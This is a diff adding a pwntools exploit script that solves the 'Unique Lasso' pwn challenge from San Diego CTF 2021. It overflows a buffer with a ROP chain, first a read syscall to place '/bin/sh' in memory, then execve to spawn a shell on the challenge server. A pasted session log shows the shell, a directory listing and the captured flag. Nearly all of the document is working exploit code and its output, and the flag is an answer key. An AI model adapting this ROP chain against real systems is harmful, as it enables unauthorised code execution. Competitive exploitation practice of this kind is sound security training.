@@ -1,0 +1,89 @@
+from pwn import *
+
+#context(os='linux', arch='amd64')
+#context.log_level = 'debug'
+
+BINARY = './uniqueLasso'
+elf  = ELF(BINARY)
+
+if len(sys.argv) > 1 and sys.argv[1] == 'r':
+  HOST = "lasso.sdc.tf"
+  PORT = 1337
+  s = remote(HOST, PORT)
+else:
+  s = process(BINARY)
+
+syscall_ret = 0x474ae5 # syscall; ret;
+pop_rax_ret = 0x4005af # pop rax; ret;
+pop_rdi_ret = 0x4006a6 # pop rdi; ret;
+pop_rsi_ret = 0x410b63 # pop rsi; ret;
+pop_rdx_ret = 0x44c616 # pop rdx; ret;
+
+s.recvuntil("(hint: its really long)\n")
+
+buf  = "A"*14
+buf += p64(pop_rdi_ret)
+buf += p64(0)
+buf += p64(pop_rsi_ret)
+buf += p64(0x6b6000)
+buf += p64(pop_rdx_ret)
+buf += p64(8)
+buf += p64(syscall_ret)
+buf += p64(pop_rax_ret)
+buf += p64(0x3b)
+buf += p64(pop_rdi_ret)
+buf += p64(0x6b6000)
+buf += p64(pop_rsi_ret)
+buf += p64(0)
+buf += p64(pop_rdx_ret)
+buf += p64(0)
+buf += p64(syscall_ret)
+s.sendline(buf)
+
+sleep(0.2)
+s.sendline("/bin/sh\x00")
+
+s.interactive()
+
+'''
+mito@ubuntu:~/CTF/San_Diego_CTF_2021/Pwn_Unique_Lasso$ python solve.py r
+[*] '/home/mito/CTF/San_Diego_CTF_2021/Pwn_Unique_Lasso/uniqueLasso'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Opening connection to lasso.sdc.tf on port 1337: Done
+[*] Switching to interactive mode
+You guessed 0
+Its gotta be way longer than that
+$ id
+uid=1000(user) gid=1000(user) groups=1000(user)
+$ ls -l
+total 60
+lrwxrwxrwx   1 nobody nogroup    7 Apr 16 05:11 bin -> usr/bin
+drwxr-xr-x   2 nobody nogroup 4096 Apr 15  2020 boot
+drwxr-xr-x   2 nobody nogroup 4096 Apr 16 05:33 dev
+drwxr-xr-x  30 nobody nogroup 4096 May  7 20:04 etc
+-rw-r--r--   1 nobody nogroup   45 Apr 18 05:19 flag.txt
+drwxr-xr-x   3 nobody nogroup 4096 May  7 20:58 home
+lrwxrwxrwx   1 nobody nogroup    7 Apr 16 05:11 lib -> usr/lib
+lrwxrwxrwx   1 nobody nogroup    9 Apr 16 05:11 lib32 -> usr/lib32
+lrwxrwxrwx   1 nobody nogroup    9 Apr 16 05:11 lib64 -> usr/lib64
+lrwxrwxrwx   1 nobody nogroup   10 Apr 16 05:11 libx32 -> usr/libx32
+drwxr-xr-x   2 nobody nogroup 4096 Apr 16 05:11 media
+drwxr-xr-x   2 nobody nogroup 4096 Apr 16 05:11 mnt
+drwxr-xr-x   2 nobody nogroup 4096 Apr 16 05:11 opt
+dr-xr-xr-x 271 nobody nogroup    0 May  8 23:49 proc
+drwx------   2 nobody nogroup 4096 Apr 16 05:32 root
+drwxr-xr-x   5 nobody nogroup 4096 Apr 23 22:21 run
+lrwxrwxrwx   1 nobody nogroup    8 Apr 16 05:11 sbin -> usr/sbin
+drwxr-xr-x   2 nobody nogroup 4096 Apr 16 05:11 srv
+drwxr-xr-x   2 nobody nogroup 4096 Apr 15  2020 sys
+drwxrwxrwt   2 nobody nogroup 4096 Apr 16 05:33 tmp
+drwxr-xr-x  13 nobody nogroup 4096 Apr 16 05:11 usr
+drwxr-xr-x  11 nobody nogroup 4096 Apr 16 05:32 var
+$ cat flag.txt
+sdctf{H0w_l0nG_w45_uR_L4ss0_m1n3_w45_ju5T_5}
+'''
+
